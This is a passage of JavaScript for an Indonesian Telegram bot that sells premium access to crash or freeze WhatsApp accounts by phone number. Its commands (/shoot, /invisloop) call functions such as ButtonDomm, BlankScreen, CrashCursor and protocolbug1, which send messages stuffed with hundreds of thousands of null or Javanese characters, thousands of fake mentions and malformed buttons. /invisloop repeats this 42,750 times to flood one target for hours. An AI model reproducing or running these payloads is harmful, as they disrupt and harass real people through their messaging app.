        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 10 minutes`
    );
    console.log(chalk.blue.bold("Invisible : Successfully submitted bug"));
});

bot.command("invisloop", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /invisloop 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\n Target to receive bugs for the next 5 hours`);

    for (let i = 0; i < 42750; i++) {
        await delaymentionFree1(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\n Target to receive bugs for the next 5 hours`
    );
    console.log(chalk.blue.bold("Invisloop : Successfully submitted bug"));
});

bot.command("shoot", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /shoot 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";
    
    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 1; i++) {
        await InVisibleX(bijipler);
        await ButtonDomm(bijipler);
        await protocolbug1(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 10 minutes`
    );
    console.log(chalk.blue.bold("Shooting : Successfully submitted bug"));
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

bot.command('addreseller', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

async function ButtonDomm(bijipler) {
Zeph.relayMessage(
bijipler,
{
interactiveMessage: {
header: {
title: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@",
hasMediaAttachment: false
},
body: {
text: "\ua9be".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: bijipler } }
);
}

//FUNCTION SW YANG DI CARI²

async function InVisibleX(bijipler) {
            let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "꧄꧄꧍"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "꧄꧄꧍"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
        
            await Zeph.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [bijipler],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: bijipler },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (bijipler) {
                await Zeph.relayMessage(
                    bijipler,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "꧄꧄꧍",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        

async function protocolbug1(bijipler, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𝙳𝙴𝙰𝚃𝙷 𝙾𝙵 𝙵𝙰𝚃𝙷𝙴𝚁@",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: bijipler,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "x".repeat(5000)
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(bijipler, MSG, {});

await Zeph.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [bijipler],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: bijipler },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Zeph.relayMessage(
bijipler,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "꫟" },
content: undefined
}
]
}
);
}
}

async function delaymentionFree(bijipler, mention) {
    // Generate an array of delay mentions with increased size
    const delaymention = Array.from({ length: 10000 }, (_, r) => ({
        title: "᭯" + "\u0000".repeat(500000), // Increased size
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    // Create the message structure
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@HaiSemua",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10000 }, () => 
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        ),
                        participant: bijipler,
                        remoteJid: "status@broadcast",
                        forwardingScore: 10000,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "10000@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: null
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    // Generate the message from content
    const msg = generateWAMessageFromContent(bijipler, MSG, {});

    // Relay the message to the status broadcast
    await Zeph.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [bijipler],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: bijipler },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // If mention is true, send a status mention message
    if (mention) {
        await Zeph.relayMessage(
            bijipler,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🌀 21 Brutality !!" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function delaymentionFree1(bijipler, mention) {
    // Generate an array of delay mentions with increased size
    const delaymention = Array.from({ length: 10000 }, (_, r) => ({
        title: "ꦾ" + "ꦾ".repeat(500000), // Increased size
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    // Create the message structure
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@HaiSemua",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10000 }, () => 
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        ),
                        participant: bijipler,
                        remoteJid: "status@broadcast",
                        forwardingScore: 10000,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "10000@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: null
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    // Generate the message from content
    const msg = generateWAMessageFromContent(bijipler, MSG, {});

    // Relay the message to the status broadcast
    await Zeph.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [bijipler],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: bijipler },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // If mention is true, send a status mention message
    if (mention) {
        await Zeph.relayMessage(
            bijipler,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🌀 21 Brutality !!" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ZynXzo",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
async function Xioss(bijipler) {
      Zeph.relayMessage(
        bijipler,
        {
          extendedTextMessage: {
            text: `𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟ -` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: bijipler,
              participant: bijipler,
              quotedMessage: {
                conversation: "𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: bijipler,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

      async function BlankScreen(bijipler, Ptcp = false) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
			await Zeph.relayMessage(bijipler, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: bijipler
					}
				} : { quoted: NullNihBos }
			);
       }

async function instantcrash(bijipler) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [bijipler],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: bijipler,
              },
            },
            body: {
              text: "𝐙𝐞𝐩𝐡𝐲𝐫𝐢𝐧⃕𝐞𝐇𝐢𝐲𝐚𝐬⃕𝐡𝐢╴͒ᝄ ",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Zeph.relayMessage(bijipler, message, {
      participant: { jid: bijipler },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Payload(bijipler) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [bijipler],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: bijipler,
                },
              },
              body: {
                text: "⿻© 𝟮𝟭𝗪ιƚԋ𝗡σ𝗞ιԃʂ⃟⿻",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await Zeph.relayMessage(bijipler, message, {
        participant: { jid: bijipler },
      });
    }


async function CrashCursor(bijipler) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⃨⃰𝐕𝚯𝐈𝐃 𝐒𝐓𝐑𝐈𝐊𝐄͢" + "ꦽ".repeat(85000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "SSS+",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [bijipler],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  contactVcard: true,
                },
                contentText: "p",
                footerText: "p",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "Zeph -      ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 99999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            actionLink: {
              url: "t.me/rainoneday",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: bijipler,
              initiatedByMe: true,
            },
            trustBannerAction: 999999,
            isSampled: true,
            externalAdReply: {
              title: 'P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              ctaPayload: "cta",
              disableNudge: true,
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "123132123123123@newsletter",
              serverMessageId: 1,
              newsletterName: "P",
              contentType: 3,
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
        },
      },
    },
  };

  await Zeph.relayMessage(bijipler, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: bijipler },
  });
}
 
 async function InvisibleLoadFast(bijipler) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [bijipler],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: bijipler,
                  },
                },
                body: {
                  text: "️⿻© 𝟮𝟭𝗪ιƚԋ𝗡σ𝗞ιԃʂ⃟⿻.      ͇" + "\u0000".repeat(122000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await Zeph.relayMessage(bijipler, message, {
          participant: { jid: bijipler },
        });
      } catch (err) {
        console.log(err);
      }
    }
    
 
async function Zet(bijipler) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [bijipler],
            isForwarded: true,
            forwardingScore: 99999,
            businessMessageForwardInfo: {
              businessOwnerJid: bijipler,
            },
          },
          body: {
            text: "⿻© 𝟮𝟭𝗪ιƚԋ𝗡σ𝗞ιԃʂ⃟⿻",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "R11",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "R11",
              },
              {
                name: "mpm",
                buttonParamsJson: "R11",
              },
            ],
          },
        },
      },
    },
  };
  
  await Zeph.relayMessage(bijipler, message, {
    participant: { jid: bijipler },
  });
}


async function OneHit(bijipler) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "Mark Zuckerberg Kontol, By JustinOfficial";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
